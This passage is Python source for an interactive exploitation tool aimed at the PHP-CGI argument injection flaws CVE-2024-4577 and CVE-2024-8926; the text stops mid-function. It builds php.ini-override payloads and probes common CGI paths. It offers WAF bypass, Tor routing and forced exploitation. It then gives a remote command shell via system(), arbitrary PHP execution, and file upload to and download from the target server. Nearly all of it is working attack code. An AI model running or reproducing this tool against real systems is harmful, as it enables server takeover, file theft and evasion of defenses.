import argparse
import requests
import sys
import urllib3
import chardet
import os
import base64
import re
import time
from urllib.parse import urlparse
import textwrap

from rich import print as rprint
from rich.panel import Panel
from rich.console import Console
from rich.text import Text
from rich.markdown import Markdown
from rich.syntax import Syntax
from rich.table import Table
import banner
from bypass_manager import apply_bypass
import tor_helper

console = Console()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Payload 參數庫
PAYLOAD_ELEMENTS = {
    1: "disable_functions%3d%26",
    2: "disable_classes%3d%26",
    3: "open_basedir%3d",
    4: "cgi.force_redirect%3d0",
    5: "cgi.redirect_status_env",
    6: "allow_url_include%3d1",
    7: "allow_url_fopen%3d1",
    8: "auto_prepend_file%3dphp://input",
    9: "file_uploads%3d1",
    10: "upload_max_filesize%3d0",
    11: "log_errors%3d0",
    12: "post_max_size%3d0",
    13: "memory_limit%3d%2B1",
    14: "enable_dl%3d1",
    15: "max_execution_time%3d0",
    16: "short_open_tag%3d1",
    17: "max_input_time%3d0",
    18: "expose_php%3d1"
}

# 預設 Payload 組合庫
PAYLOAD_COMBINATIONS = {
    "1": [1, 2, 3, 4, 5, 6, 7, 8],
    "2": [1, 4, 5, 6, 8],
    "3": [4, 6, 8],
}

# 連接符
CVE_PREFIXES = {
    "CVE-2024-4577": "%ADd",
    "CVE-2024-8926": "%a8-d%a8"
}

# 常見 CGI 路徑字典
CGI_POINTS = [
    "/php-cgi/php-cgi.exe", "/cgi-bin/php-cgi.exe",
    "/php-cgi.exe", "/cgi/php-cgi.exe", "/php.exe",
    "/cgi-bin/php.exe", "/cgi/php.exe",
    "/index.php", "/"
]

# 全域變數初始設定
enable_log = False
VERBOSE_MODE = False
use_tor = False
tor_session = None
timeout_value = 10
active_request_template = None
selected_payload_group = "1"
PAYLOAD_GROUPS = {}
forced_cgipoint = None
delay_between_requests = 0

# Parse arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description="CVE-2024-4577 & CVE-2024-8926 Exploitation Tool")
    parser.add_argument("-u", "--url", required=True, help="目標網址")
    parser.add_argument("--timeout", type=int, default=10, help="預設為10，若須逾時秒數，0 為無限等待，建議 1~30，最大 120")
    parser.add_argument("--log", action="store_true", help="啟用shell log 模式")
    parser.add_argument("--verbose", action="store_true", help="顯示詳細請求資訊，更好的進行判斷")
    parser.add_argument("--payload", nargs="?", const="SELECT", help="選擇 Payload 編號，預設為1，若未指定值則進入選單選擇，輸入 C 則進入自訂模式")
    parser.add_argument("--cgipoint", nargs="+", help="指定一組或多組 CGI 路徑，例如 --cgipoint \"/a.php\",\"/b.php\"")
    parser.add_argument("--tor", action="store_true", help="啟用 Tor 模式")
    parser.add_argument("--bypass", action="store_true", help="啟用 WAF 繞過測試")
    parser.add_argument("--force", action="store_true", help="強制進入漏洞利用模式，即使未偵測到漏洞")
    parser.add_argument("--delay", type=float, default=0, help="每次請求後延遲秒數（預設 0，可設 0.5 ~ 5）")
    parser.add_argument("--no-effects", action="store_true", help="關閉所有動畫與延遲效果，加快腳本執行")

    return parser.parse_args()

# 組合 Payload
def generate_payload_groups():
    global PAYLOAD_GROUPS
    PAYLOAD_GROUPS = {
        group_id: {
            cve: "+".join([f"{prefix}+{PAYLOAD_ELEMENTS[e]}" for e in elements])
            for cve, prefix in CVE_PREFIXES.items()
        }
        for group_id, elements in PAYLOAD_COMBINATIONS.items()
    }
    return PAYLOAD_GROUPS

PAYLOAD_GROUPS = generate_payload_groups()
selected_payload_group = "1"
PAYLOADS = PAYLOAD_GROUPS[selected_payload_group]

# Payload選擇
def get_selected_payload_group(args):
    global selected_payload_group, PAYLOADS
    if "--payload" not in args:
        selected_payload_group = "1"
        PAYLOADS = PAYLOAD_GROUPS[selected_payload_group]
        return selected_payload_group, PAYLOADS

    payload_index = args.index("--payload") + 1
    if payload_index >= len(args):
        rprint("[bold red][!] 沒有指定 Payload，請手動選擇！[/bold red]")
        return show_payload_list()

    user_choice = args[payload_index]
    if user_choice in PAYLOAD_GROUPS:
        selected_payload_group = user_choice
        PAYLOADS = PAYLOAD_GROUPS[selected_payload_group]
        return selected_payload_group, PAYLOADS

    rprint("[bold yellow][!] 無效的 Payload，請手動選擇！[/bold yellow]")
    return show_payload_list()

# 顯示可用 `Payload`，讓使用者手動選擇
def show_payload_list():
    global selected_payload_group
    rprint("[bold cyan][*] 可用的 Payload 組合：[/bold cyan]")
    sleep_safe(0.1)
    
    rprint("[dim]─" * 50)    
    for idx in sorted(PAYLOAD_COMBINATIONS.keys(), key=int):
        rprint(f"[bold cyan]{idx}) 所包含 Payload 元素如下：[/bold cyan]")

        printed = set()
        for element_key in PAYLOAD_COMBINATIONS[idx]:
            if element_key not in PAYLOAD_ELEMENTS:
                continue
            content = PAYLOAD_ELEMENTS[element_key].strip()
            if not content or content in printed:
                continue
            printed.add(content)

            text = Text("• ", style="green")
            text.append(content, style="white")
            if "php://input" in content:
                start = content.find("php://input")
                end = start + len("php://input")
                text.stylize("bold red", 2 + start, 2 + end)
            console.print(text)
            sleep_safe(0.04)

        rprint("[dim]─" * 50)
        sleep_safe(0.02)

    while True:
        rprint("[bold cyan][?][/bold cyan] 請輸入對應的編號來切換 Payload 組或使用 C 自訂 Payload : ", end="")
        user_choice = input().strip()
        if user_choice in PAYLOAD_COMBINATIONS:
            selected_payload_group = user_choice
            print()
            break
        elif user_choice.upper() == "C":
            rprint("\n[bold blue][*] 進入自訂 Payload 模式...[/bold blue]")
            selected_payload_group = customize_payload()
            break
        else:
            rprint("[bold yellow][!] 無效輸入，請輸入正確的數字或 `C` 來自訂 Payload！[/bold yellow]\n")

    return selected_payload_group, PAYLOAD_COMBINATIONS[selected_payload_group]

# 自訂 Payload
def customize_payload():
    global PAYLOAD_COMBINATIONS, PAYLOAD_GROUPS, PAYLOADS, selected_payload_group

    rprint("\n[bold cyan][*] 目前可用的 Payload 元素：[/bold cyan]")
    rprint("[dim]─" * 50)
    sleep_safe(0.1)
    max_key_len = max(len(str(k)) for k in PAYLOAD_ELEMENTS)
    for key in sorted(PAYLOAD_ELEMENTS.keys(), key=int):
        content = PAYLOAD_ELEMENTS[key]
        key_str = f"{key:0{max_key_len}d}"
        text = Text(f"[{key_str}] ", style="bold green")
        text.append(content, style="white")
        if "php://input" in content:
            start = content.find("php://input")
            end = start + len("php://input")
            text.stylize("bold red", len(f"[{key_str}] ") + start, len(f"[{key_str}] ") + end)
        console.print(text)
        sleep_safe(0.02)
        print()
        sleep_safe(0.02)

    rprint("[dim]─" * 50)

    while True:
        rprint("[bold cyan][?][/bold cyan] 請輸入要組合的元素編號（用空格分隔，例如：1 3 5 7）：", end="")
        user_input = input().strip()
        selected_elements = user_input.split()

        if all(e.isdigit() and int(e) in PAYLOAD_ELEMENTS for e in selected_elements):
            selected_elements = [int(e) for e in selected_elements]
            break
        else:
            rprint("[bold red][!] 無效輸入，請輸入可用的編號，用空格分隔！[/bold red]\n")

    new_id = str(len(PAYLOAD_COMBINATIONS) + 1)
    PAYLOAD_COMBINATIONS[new_id] = selected_elements
    PAYLOAD_GROUPS[new_id] = {
        cve: "+".join([f"{prefix}+{PAYLOAD_ELEMENTS[e]}" for e in selected_elements])
        for cve, prefix in CVE_PREFIXES.items()
    }

    rprint("\n[bold green][+] 已成功新增自訂 Payload！[/bold green]")
    sleep_safe(0.05)
    
    text_4577 = Text("[*] CVE-2024-4577 Payload:\n    ", style="cyan")
    payload_4577 = PAYLOAD_GROUPS[new_id]['CVE-2024-4577']
    text_4577.append(payload_4577, style="white")
    if "php://input" in payload_4577:
        start = payload_4577.find("php://input")
        end = start + len("php://input")
        text_4577.stylize("bold red", 4 + start, 4 + end)  # 4 is indent offset
    console.print(text_4577)
    sleep_safe(0.05)
    
    text_8926 = Text("[*] CVE-2024-8926 Payload:\n    ", style="cyan")
    payload_8926 = PAYLOAD_GROUPS[new_id]['CVE-2024-8926']
    text_8926.append(payload_8926, style="white")
    if "php://input" in payload_8926:
        start = payload_8926.find("php://input")
        end = start + len("php://input")
        text_8926.stylize("bold red", 4 + start, 4 + end)  # 4 is indent offset
    console.print(text_8926)
    sleep_safe(0.05)
    
    print()
    selected_payload_group = new_id
    PAYLOADS = PAYLOAD_GROUPS[selected_payload_group]
    
    return new_id
    
def interactive_bypass_setup():
    try:
        from bypass_manager import load_all_tampers
    except ImportError:
        rprint("[bold red][!] 錯誤：未找到 `bypass_manager` 模組，請確認此模組是否存在。[/bold red]")
        return [], 0

    all_tampers = load_all_tampers()
    rprint("\n[bold cyan][*][/bold cyan] 可用繞過方案：")
    rprint("[dim]─" * 50)
    for idx, (name, desc) in enumerate(all_tampers.items(), 1):
        rprint(f"[bold cyan]{idx})[/bold cyan] [bold white]{name}[/bold white] ：")
        rprint(f"[grey70]{desc}[/grey70]\n")
        time.sleep(0.07)
    rprint("[dim]─" * 50)

    rprint("[bold cyan][?][/bold cyan] 請輸入要啟用的方案編號（可多選，例如：1 3 4）: ", end="")
    chosen = input().strip().split()
    selected = []
    for c in chosen:
        if c.isdigit() and 1 <= int(c) <= len(all_tampers):
            selected.append(list(all_tampers.keys())[int(c) - 1])

    if len(selected) > 1:
        rprint("[bold yellow][!][/bold yellow] [yellow]提醒：多個繞過方案將同時套用！[/yellow]")

    rprint("[bold cyan][?][/bold cyan] 請輸入重試次數（建議 1-10）: ", end="")
    retries = input().strip()
    retries = int(retries) if retries.isdigit() and int(retries) > 0 else 1
    print()
    return selected, retries


def run_bypass_mode(target, bypass_modules, retry_count, custom_cgi_list=None):

    cgi_list = custom_cgi_list if custom_cgi_list else CGI_POINTS

    for payload_key in PAYLOADS:
        for i in range(retry_count):
            for ep in cgi_list:
                req = {
                    "url": target,
                    "cgipoint": ep,
                    "payload": PAYLOADS[payload_key],
                    "headers": {},
                    "post_data": "<?php echo 'TEST_VULNTEST_CVE-2024-4577'; die(); ?>",
                    "cve_id": payload_key
                }

                req = apply_bypass(req, bypass_modules, attempt=i)

                target_url = f"{req['url']}{req['cgipoint']}?{req['payload']}"
                resp = send_request(
                    target_url,
                    req["post_data"],
                    timeout=timeout_value,
                    headers=req.get("headers", {})
                )

                if resp and "TEST_VULNTEST_CVE-2024-4577" in resp:
                    rprint(f"[bold green][+] 找到 CGI 注入點：[/bold green] [cyan]{req['cgipoint']}[/cyan] (漏洞: [magenta]{payload_key}[/magenta])\n")
                    return req["cgipoint"], payload_key

    rprint("[bold red][-] 所有策略組合嘗試失敗[/bold red]")
    return None, None

# 自動轉換編碼
def decode_response(response):
    detected = chardet.detect(response.content)
    encoding = detected.get('encoding')
    return response.content.decode(encoding, errors='replace') if encoding else response.content.decode('utf-8', errors='replace')

# 發送請求
def send_request(url, data, timeout=None, headers=None, use_template=False):
    if headers is None:
        headers = {}
    try:
        global active_request_template
        if use_template and active_request_template:
            url = f"{url}{active_request_template['cgipoint']}?{active_request_template['payload']}"
            headers = active_request_template.get("headers", {})

        if VERBOSE_MODE:
            rprint("\n[bold cyan]======================================= 發送請求 =======================================[/bold cyan]")
            table = Table(show_header=False, box=None, padding=(0,1))
            wrapped_url = textwrap.fill(url, width=65)
            table.add_row("[cyan]URL[/cyan]", Text(wrapped_url, style="white"))
            table.add_row("[cyan]Data[/cyan]", str(data))
            table.add_row("[cyan]Timeout[/cyan]", str(timeout))
            if headers:
                wrapped_headers = textwrap.fill(str(headers), width=65)
                table.add_row("[cyan]Headers[/cyan]", Text(wrapped_headers, style="white"))
            console.print(table)
            rprint("[bold cyan]========================================================================================[/bold cyan]\n")

        if isinstance(data, str):
            data = data.encode("utf-8")

        if use_tor:
            response = tor_session.post(url, data=data, headers=headers, timeout=timeout)
        else:
            response = requests.post(url, data=data, headers=headers, verify=False, timeout=timeout)
            
        if VERBOSE_MODE:
            rprint("[bold cyan]======================================= 回應資訊 =======================================[/bold cyan]")
            table = Table(show_header=False, box=None, padding=(0,1))
            status_code = response.status_code
            if 200 <= status_code < 300:
                status_color = "green"
            elif 300 <= status_code < 400:
                status_color = "bright_cyan"
            elif status_code == 401:
                status_color = "khaki1"
            elif 400 <= status_code < 500:
                status_color = "blue"
            elif 500 <= status_code < 600:
                status_color = "red"
            else:
                status_color = "magenta"
            table.add_row(f"[cyan]Status[/cyan]", f"[{status_color}]{status_code}[/{status_color}]")
            table.add_row("[cyan]Preview[/cyan]", response.text[:500])
            console.print(table)
            rprint("[bold cyan]========================================================================================[/bold cyan]\n")
        # delay 模式       
        if delay_between_requests > 0:
            sleep_safe(delay_between_requests)
    
        return decode_response(response)
    except Exception as e:
        if VERBOSE_MODE:
            rprint("[bold red]========================================================================================[/bold red]\n")
            rprint(f"[bold red][!] 請求錯誤: {e}[/bold red]")
            rprint("[bold red]========================================================================================[/bold red]\n")
        else:
            rprint(f"[bold red][!] 請求錯誤: {e}[/bold red]")

        return None

# 枚舉注入點
def choose_cgipoint(url, payload_key, custom_cgi_list=None):
    test_payload = "<?php echo 'TEST_VULNTEST_CVE-2024-4577'; die(); ?>"

    if VERBOSE_MODE:
        rprint(f"[bold violet]============================= 測試 Payload : {payload_key} =============================[/bold violet]")
        table = Table(show_header=False, box=None, padding=(0, 1))
        wrapped_payload = textwrap.fill(PAYLOADS[payload_key], width=65)
        payload_text = Text(wrapped_payload, style="white")
        table.add_row("[violet]Key[/violet]", Text(str(payload_key), style="white"))
        table.add_row("[violet]Payload[/violet]", payload_text)
        console.print(table)
        rprint("[bold violet]========================================================================================[/bold violet]\n")

    cgi_list = custom_cgi_list if custom_cgi_list else CGI_POINTS

    for ep in cgi_list:
        target_url = f"{url}{ep}?{PAYLOADS[payload_key]}"
        resp = send_request(target_url, test_payload, timeout=timeout_value)

        if resp and 'TEST_VULNTEST_CVE-2024-4577' in resp:
            rprint(f"[bold green][+] 找到 CGI 注入點:[/bold green] [cyan]{ep}[/cyan] (漏洞: [magenta]{payload_key}[/magenta])\n")
            return ep

    if VERBOSE_MODE:
        rprint("[bold yellow]========================================================================================[/bold yellow]")
        rprint(f"[yellow][-] 未找到漏洞 {payload_key}[/yellow]")
        rprint("[bold yellow]========================================================================================[/bold yellow]\n")
    else:
        rprint(f"[yellow][-] 未找到漏洞 {payload_key}[/yellow]")

    return None

    # 自動掃描邏輯
    for ep in CGI_POINTS:
        target_url = f"{url}{ep}?{PAYLOADS[payload_key]}"
        resp = send_request(target_url, test_payload, timeout=timeout_value)
        if resp and 'TEST_VULNTEST_CVE-2024-4577' in resp:
            if VERBOSE_MODE:
                rprint("[bold green]========================================================================================[/bold green]")
                rprint(f"[bold green][+] 找到CGI注入點:[bold green] [cyan]{ep}[/cyan] (漏洞: [magenta]{payload_key}[/magenta])")
                rprint("[bold green]========================================================================================[/bold green]\n")
            else:
                rprint(f"[bold green][+] 找到CGI注入點:[bold green] [cyan]{ep}[/cyan] (漏洞: [magenta]{payload_key}[/magenta])\n")
            return ep

    if VERBOSE_MODE:
        rprint("[bold yellow]========================================================================================[/bold yellow]")
        rprint(f"[yellow][-] 未找到漏洞 {payload_key}[/yellow]")
        rprint("[bold yellow]========================================================================================[/bold yellow]\n")
    else:    
        rprint(f"[yellow][-] 未找到漏洞 {payload_key}[/yellow]")

    return None
    
# 移除不能用於檔名的字元
def sanitize_filename(filename):
    return re.sub(r'[\/:*?"<>|]', '_', filename)

# 以攻擊目標的 host 為基礎建立檔案名稱
def get_unique_filepath(directory, host):
    base_filename = sanitize_filename(host)
    candidate = os.path.join(directory, f"{base_filename}.txt")
    i = 1
    while os.path.exists(candidate):
        candidate = os.path.join(directory, f"{base_filename}_{i}.txt")
        i += 1
    return candidate

# 取得目標網站的根目錄
def get_remote_docroot(url, cgipoint, payload_key, bypass_modules):
    payload = "<?php echo $_SERVER['DOCUMENT_ROOT']; die(); ?>"
    req = {
        "url": url,
        "cgipoint": cgipoint,
        "payload": PAYLOADS[payload_key],
        "headers": {},
        "post_data": payload,
        "cve_id": payload_key
    }

    req = apply_bypass(req, bypass_modules, attempt=0)
    target_url = f"{req['url']}{req['cgipoint']}?{req['payload']}"
    resp = send_request(target_url, req["post_data"], timeout=timeout_value, headers=req["headers"])

    return resp.strip() if resp else None

# 交互式shell
def exploit_shell(url, cgipoint, payload_key, bypass_modules):
    rprint("[cyan][*] 輸入命令，輸入 exit 結束，可使用 --save 儲存單次輸出：[/cyan]")
    host = urlparse(url).netloc
    log_dir = os.path.join(os.getcwd(), "log")
    if enable_log:
        rprint("[cyan][*] log模式已啟動[/cyan]")
        if not os.path.exists(log_dir):
            os.makedirs(log_dir)
    print()
    log_path = os.path.join(log_dir, f"{host}.log") if enable_log else None

    while True:
        cmd = input("shell> ").strip()
        if cmd.lower() == "exit":
            rprint("[green][+] 已退出交互式 shell 模式\n[/green]")
            break

        parts = cmd.split("--save")
        real_cmd = parts[0].strip()
        save_path = parts[1].strip() if len(parts) > 1 else None

        if save_path == "":
            save_dir = os.path.join(os.getcwd(), "output")
            if not os.path.exists(save_dir):
                os.makedirs(save_dir)
            save_path = get_unique_filepath(save_dir, host)

        php_code = f"<?php system('{real_cmd}'); die(); ?>"
        if active_request_template:
            resp = send_request(url, php_code, timeout=timeout_value, use_template=True)
        else:
            req = {
                "url": url,
                "cgipoint": cgipoint,
                "payload": PAYLOADS[payload_key],
                "headers": {},
                "post_data": php_code,
                "cve_id": payload_key
            }
            req = apply_bypass(req, bypass_modules, attempt=0)
            full_url = f"{req['url']}{req['cgipoint']}?{req['payload']}"
            resp = send_request(full_url, req["post_data"], timeout=timeout_value, headers=req["headers"])

        output = resp.strip() if resp else ""
        print(output)

        if save_path:
            save_path = os.path.abspath(save_path)
            with open(save_path, "w", encoding="utf-8") as f:
                f.write(output)
            rprint(f"[green][+] 輸出結果已儲存至 {save_path}[/green]")
        print()
        if enable_log:
            with open(log_path, "a", encoding="utf-8") as f:
                f.write(f"CMD: {real_cmd}\n{output}\n{'-'*20}\n")

# 自訂php
def custom_php_mode(url, cgipoint, payload_key, bypass_modules):
    rprint("[cyan][*] 輸入PHP程式碼，輸入 EOF 結束，可使用 --save 儲存輸出：[/cyan]")

    php_code = ""
    save_path = None
    host = urlparse(url).netloc

    while True:
        line = input()
        if line.strip().startswith("EOF"):
            parts = line.split("--save")
            if len(parts) > 1:
                save_path = parts[1].strip()
                if save_path == "":
                    save_dir = os.path.join(os.getcwd(), "output")
                    if not os.path.exists(save_dir):
                        os.makedirs(save_dir)
                    save_path = get_unique_filepath(save_dir, host)
            break
        php_code += line + "\n"

    payload = f"<?php {php_code}\ndie(); ?>"
    if active_request_template:
        resp = send_request(url, payload, timeout=timeout_value, use_template=True)
    else:
        req = {
            "url": url,
            "cgipoint": cgipoint,
            "payload": PAYLOADS[payload_key],
            "headers": {},
            "post_data": payload,
            "cve_id": payload_key
        }
        req = apply_bypass(req, bypass_modules, attempt=0)
        target_url = f"{req['url']}{req['cgipoint']}?{req['payload']}"
        resp = send_request(target_url, req["post_data"], timeout=timeout_value, headers=req["headers"])

    output = resp.strip() if resp else ""
    rprint("[dim]─" * 150)
    print(output)

    if save_path:
        save_path = os.path.abspath(save_path)
        with open(save_path, "w", encoding="utf-8") as f:
            f.write(output)
        rprint(f"[green][+] PHP輸出結果已儲存至 {save_path}[/green]")
    rprint("[dim]─" * 150)

# 上傳檔案
def upload_file(url, cgipoint, payload_key, bypass_modules):
    local = input("本地檔案路徑：").strip()
    remote = input("目標完整路徑（若留空將上傳至網站根目錄）：").strip()
    print()
    if remote == "":
        docroot = get_remote_docroot(url, cgipoint, payload_key, bypass_modules)
        if docroot:
            remote = os.path.join(docroot, os.path.basename(local)).replace("\\", "/")
            rprint(f"[green][*] 已自動設定上傳路徑為: {remote}[/green]")
        else:
            rprint("[red][!] 無法取得網站根目錄，請手動指定完整路徑[/red]")
            return

    try:
        with open(local, "r", encoding="utf-8", errors="ignore") as f:
            raw_content = f.read()
    except Exception as e:
        rprint(f"[red][!] 讀取本地檔案失敗: {e}[/red]")
        return

    payload = f"<?php file_put_contents('{remote}', '{raw_content}'); echo 'OK'; die(); ?>"
    if active_request_template:
        resp = send_request(url, payload, timeout=timeout_value, use_template=True)
    else:
        req = {
            "url": url,
            "cgipoint": cgipoint,
            "payload": PAYLOADS[payload_key],
            "headers": {},
            "post_data": payload,
            "cve_id": payload_key
        }
        req = apply_bypass(req, bypass_modules, attempt=0)
        target_url = f"{req['url']}{req['cgipoint']}?{req['payload']}"
        resp = send_request(target_url, req["post_data"], timeout=timeout_value, headers=req["headers"])

    if resp and "OK" in resp:
        rprint(f"[green][+] 成功上傳至 {remote}[/green]")
    else:
        rprint("[red][!] 上傳失敗，無回應[/red]")
    print()

# 下載檔案
def download_file(url, cgipoint, payload_key, bypass_modules):
    remote = input("[?] 遠端檔案路徑：").strip()
    if not remote:
        rprint("[bold red][!] 未輸入檔案路徑，取消下載。[/bold red]\n")
        return

    local = os.path.join("download", os.path.basename(remote))
    if not os.path.exists("download"):
        os.makedirs("download")

    payload = f"<?php echo file_get_contents('{remote}'); die(); ?>"
    if active_request_template:
        resp = send_request(url, payload, timeout=timeout_value, use_template=True)
    else:
        req = {
            "url": url,
            "cgipoint": cgipoint,
            "payload": PAYLOADS[payload_key],
            "headers": {},
            "post_data": payload,
            "cve_id": payload_key
        }
        req = apply_bypass(req, bypass_modules, attempt=0)
        target_url = f"{req['url']}{req['cgipoint']}?{req['payload']}"
        resp = send_request(target_url, req["post_data"], timeout=timeout_value, headers=req["headers"])

    if not resp or resp.strip() == "":
        rprint(f"[bold red][!] 檔案不存在或伺服器無回應：{remote}[/bold red]\n")
        return

    with open(local, "wb") as f:
        f.write(resp.encode("utf-8"))
    rprint(f"[bold green][+] 已下載至 {local}[/bold green]\n")

#動畫模式
def sleep_safe(sec):
    global disable_effects
    if not disable_effects and sec > 0:
        time.sleep(sec)

# Exploit 模式參數切換選單
def exploit_settings_menu(state):
    while True:
        print()
        sleep_safe(0.07)
        rprint("[bold cyan][⚙️ 利用階段參數設定選單][/bold cyan]\n")
        sleep_safe(0.07)

        payload_display = "自訂" if state["selected_payload_group"] not in PAYLOAD_COMBINATIONS else state["selected_payload_group"]
        bypass_info = f"{', '.join(state['bypass_modules_selected'])}" if state['bypass_modules_selected'] else "未選擇"

        menu_lines = [
            f"[cyan]1)[/cyan] 切換荷載 Payload        [bold cyan]{payload_display}[/bold cyan]",
            f"[cyan]2)[/cyan] 繞過模組 Bypass         {'[bold cyan]' + bypass_info + '[/bold cyan]' if bypass_info else '[dim]未選擇[/dim]'}",
            f"[cyan]3)[/cyan] 等待時間 Timeout        [bold]{state['timeout_value']} 秒[/bold]",
            f"[cyan]4)[/cyan] 請求延遲 Delay          [bold]{state['delay_between_requests']} 秒[/bold]",
            f"[cyan]5)[/cyan] 自動紀錄 Log            {'[bold bold]開啟[/bold bold]' if state['enable_log'] else '[dim]關閉[/dim]'}",
            f"[cyan]6)[/cyan] 詳細模式 Verbose        {'[bold bold]開啟[/bold bold]' if state['VERBOSE_MODE'] else '[dim]關閉[/dim]'}",
            f"[cyan]7)[/cyan] 動畫效果 Effects        {'[bold bold]開啟[/bold bold]' if not state['disable_effects'] else '[dim]關閉[/dim]'}",
            f"[cyan]8)[/cyan] 強制利用 Force          {'[bold bold]開啟[/bold bold]' if state['force_mode'] else '[dim]關閉[/dim]'}",
            f"[cyan]9)[/cyan] 儲存並返回 Exploit 選單"
        ]

        for line in menu_lines:
            rprint(line)
            sleep_safe(0.07)

        choice = input(">> ").strip()
        print()

        if choice == "1":
            state["selected_payload_group"], _ = show_payload_list()
            state["PAYLOADS"] = PAYLOAD_GROUPS.get(state["selected_payload_group"], PAYLOAD_GROUPS["1"])
            rprint("[bold green][*] Payload 組合已更新！[/bold green]")

        elif choice == "2":
            modules, _ = interactive_bypass_setup()
            state["bypass_modules_selected"] = modules
            rprint("[bold green][*] 繞過模組設定已更新！[/bold green]")

        elif choice == "3":
            try:
                new_timeout = int(input("[?] 請輸入新的 timeout 秒數（0~120，0 表示無限等待）：").strip())
                if new_timeout < 0 or new_timeout > 120:
                    raise ValueError
                state["timeout_value"] = new_timeout
                rprint("[bold green][*] Timeout 已更新！[/bold green]")
            except:
                rprint("[bold red][!] 輸入錯誤，timeout 必須是 0~120 的整數[/bold red]")

        elif choice == "4":
            try:
                new_delay = float(input("[?] 請輸入新的 delay 秒數（0~10）：").strip())
                if new_delay < 0 or new_delay > 10:
                    raise ValueError
                state["delay_between_requests"] = new_delay
                rprint("[bold green][*] Delay 已更新！[/bold green]")
            except:
                rprint("[bold red][!] 輸入錯誤，delay 必須是 0~10 的數字[/bold red]")

        elif choice == "5":
            state["enable_log"] = not state["enable_log"]
            rprint("[bold green][*] Log 模式已切換為：[/bold green]" + ("[green]開啟[/green]" if state["enable_log"] else "[dim]關閉[/dim]"))

        elif choice == "6":
            state["VERBOSE_MODE"] = not state["VERBOSE_MODE"]
            rprint("[bold green][*] Verbose 模式已切換為：[/bold green]" + ("[green]開啟[/green]" if state["VERBOSE_MODE"] else "[dim]關閉[/dim]"))

        elif choice == "7":
            state["disable_effects"] = not state["disable_effects"]
            rprint("[bold green][*] 動畫效果已切換為：[/bold green]" + ("[dim]關閉[/dim]" if state["disable_effects"] else "[green]開啟[/green]"))

        elif choice == "8":
            state["force_mode"] = not state["force_mode"]
            rprint("[bold green][*] 強制利用模式已切換為：[/bold green]" + ("[green]開啟[/green]" if state["force_mode"] else "[dim]關閉[/dim]"))

        elif choice == "9":
            break

        else:
            rprint("[bold red][!] 無效的選擇，請重新輸入！[/bold red]")


# 失敗後動作清單
def show_fail_menu(
    target,
    selected_payload_group,
    bypass_modules_selected,
    bypass_retry_count,
    forced_cgipoints,
    timeout_value,
    delay_between_requests,
    enable_log,
    VERBOSE_MODE,
    disable_effects,
    force_mode,
    first_round=False
):
    print()
    header_text = "[-] 未找到可用漏洞，切換設定後可選擇 6 重新測試：" if first_round \
        else "[!] 請確認設定後選擇 6 開始測試："
    panel_style = "bold red" if first_round else "bold yellow"
    console.print(Panel(header_text, title="", style=panel_style, expand=False))

    payload_display = "自訂" if selected_payload_group not in PAYLOAD_COMBINATIONS else selected_payload_group
    bypass_info = f"{', '.join(bypass_modules_selected)}；次數：{bypass_retry_count}" if bypass_modules_selected else "未選擇"
    cgi_display = "預設" if not forced_cgipoints else ", ".join(forced_cgipoints)

    menu_items = [
        ("1", ":satellite: 變更目標網址", f"[bold blue]{target}[/bold blue]"),
        ("2", ":gear: 選擇 Payload 組合", f"[bold cyan]{payload_display}[/bold cyan]"),
        ("3", ":zap: 設定繞過方案", f"[bold cyan]{bypass_info}[/bold cyan]"),
        ("4", ":wrench: 指定 CGI 路徑", f"[bold cyan]{cgi_display}[/bold cyan]"),
        ("5", "⚙️ 其他參數設定", ""),
        ("6", "🔁 開始重新測試", "（使用上列設定）"),
        ("7", "❌ 離開程式", "")
    ]

    for idx, desc, info in menu_items:
        sleep_safe(0.05)
        if info:
            rprint(f"[cyan]{idx})[/cyan] {desc} [{info}]")
        else:
            rprint(f"[cyan]{idx})[/cyan] {desc}")

    return input(">> ").strip()


# 失敗選單選擇
def handle_fail_menu_action(choice, state):
    if choice == "6":
        return "retry"  # 回傳信號給外部 while 迴圈
    elif choice == "7":
        rprint("[bold yellow][*] 程式結束[/bold yellow]")
        sys.exit(0)

    print("\n" + "-" * 50)

    if choice == "1":
        state["target"] = input("[?] 輸入新目標 URL: ").strip()
        rprint("[bold green][*] 目標已更新[/bold green]")

    elif choice == "2":
        state["selected_payload_group"], _ = show_payload_list()
        state["PAYLOADS"] = PAYLOAD_GROUPS.get(state["selected_payload_group"], PAYLOAD_GROUPS["1"])
        rprint("[bold green][*] Payload 已更新[/bold green]")

    elif choice == "3":
        state["enable_bypass"] = True
        state["bypass_modules_selected"], state["bypass_retry_count"] = interactive_bypass_setup()
        rprint("[bold green][*] 繞過設定已更新[/bold green]")

    elif choice == "4":
        raw = input("輸入 CGI 路徑（可多個，以空格分隔，留空為預設）: ").strip()
        if raw:
            state["forced_cgipoints"] = raw.split()
        else:
            state["forced_cgipoints"] = []
        rprint("[bold green][*] CGI 路徑已更新[/bold green]")

    elif choice == "5":
        fail_settings_menu(state)

    sleep_safe(0.2)
    return "continue"

# 其他參數設定
def fail_settings_menu(state):
    while True:
        print()
        sleep_safe(0.07)
        rprint("[bold cyan][⚙️ 測試參數設定選單][/bold cyan]\n")
        sleep_safe(0.07)
        menu_lines = [
            f"[cyan]1)[/cyan] 等待時間 Timeout           [bold]{state['timeout_value']} 秒[/bold]",
            f"[cyan]2)[/cyan] 請求延遲 Delay             [bold]{state['delay_between_requests']} 秒[/bold]",
            f"[cyan]3)[/cyan] 自動紀錄 Log               {'[bold]開啟[/bold]' if state['enable_log'] else '[dim]關閉[/dim]'}",
            f"[cyan]4)[/cyan] 詳細模式 Verbose           {'[bold]開啟[/bold]' if state['VERBOSE_MODE'] else '[dim]關閉[/dim]'}",
            f"[cyan]5)[/cyan] 動畫效果 Effects           {'[dim]關閉[/dim]' if state['disable_effects'] else '[bold]開啟[/bold]'}",
            f"[cyan]6)[/cyan] 強制利用 Force             {'[bold]開啟[/bold]' if state['force_mode'] else '[dim]關閉[/dim]'}",
            f"[cyan]7)[/cyan] 保存並返回選單"
        ]

        for line in menu_lines:
            rprint(line)
            sleep_safe(0.07)

        choice = input(">> ").strip()
        print()

        if choice == "1":
            try:
                val = int(input("輸入 Timeout 時間（1～120，或 0 為無限等待）: ").strip())
                if 0 <= val <= 120:
                    state["timeout_value"] = val
                    rprint("[bold green][*] Timeout 已更新[/bold green]")
                else:
                    rprint("[red][!] 請輸入 0~120 之間的整數[/red]")
            except:
                rprint("[red][!] 輸入格式錯誤[/red]")

        elif choice == "2":
            try:
                val = float(input("輸入延遲秒數（例如 1.5，可為 0）: ").strip())
                if 0 <= val <= 10:
                    state["delay_between_requests"] = val
